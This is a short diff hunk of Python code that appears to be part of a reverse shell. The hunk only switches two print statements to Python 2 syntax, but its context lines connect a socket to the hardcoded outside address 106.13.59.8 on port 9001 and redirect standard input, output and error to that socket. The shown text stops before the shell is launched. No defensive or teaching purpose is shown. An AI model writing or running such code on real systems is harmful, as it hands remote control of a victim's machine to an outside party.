@@ -8,9 +8,9 @@ def main():
 	s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
 	try:
 		s.connect(('106.13.59.8',9001))
-		print ('connect ok')
+		print 'connect ok'
 	except:
-		print ('connect faild')
+		print 'connect faild'
 	os.dup2(s.fileno(),0)
 	os.dup2(s.fileno(),1)
 	os.dup2(s.fileno(),2)
